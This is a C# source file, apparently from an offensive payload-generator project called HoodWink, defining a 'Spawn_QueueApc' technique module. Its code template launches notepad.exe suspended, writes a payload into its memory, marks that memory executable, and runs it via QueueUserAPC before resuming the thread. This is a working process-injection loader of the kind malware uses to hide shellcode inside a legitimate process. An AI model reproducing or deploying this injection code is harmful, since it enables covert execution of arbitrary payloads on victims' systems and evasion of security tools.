using System.Collections.Generic;

namespace HoodWink.Languages.Csharp.Techniques
{
    public class Spawn_QueueApc : Models.Base.Technique
    {
        public override string Description => "Spawn notepad.exe and Inject via QueueApc";
        public override List<string> FileDependencies => new List<string> { @"Languages\Csharp\FileDependencies\Kernel32.cs" };

        public override string Using => @"using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using HoodWink.Languages.Csharp.FileDependencies;";

        public override string ApiImports => @"// to allocate mem
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();";

        public override string MainLogic => @"var pa = new Kernel32.SECURITY_ATTRIBUTES();
         pa.nLength = Marshal.SizeOf(pa);

         var ta = new Kernel32.SECURITY_ATTRIBUTES();
         ta.nLength = Marshal.SizeOf(ta);

         var si = new Kernel32.STARTUPINFO();

         if (!Kernel32.CreateProcess(@""C:\Windows\System32\notepad.exe"", null,
             ref pa, ref ta,
             false,
             Kernel32.CreationFlags.CreateSuspended,
             IntPtr.Zero, @""C:\Windows\System32"", ref si, out var pi))
         {
            return;
         }

         var baseAddress = Kernel32.VirtualAllocEx(
             pi.hProcess,
             IntPtr.Zero,
             payload.Length,
             Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
             Kernel32.MemoryProtection.ReadWrite);

         Kernel32.WriteProcessMemory(
             pi.hProcess,
             baseAddress,
             payload,
             payload.Length,
             out _);

         Kernel32.VirtualProtectEx(
             pi.hProcess,
             baseAddress,
             payload.Length,
             Kernel32.MemoryProtection.ExecuteRead,
             out _);

         Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

         _ = Kernel32.ResumeThread(pi.hThread);";

        public override string AdditionalFunctions => @"//Spawn_QueueApc Additional Functions";
    }
}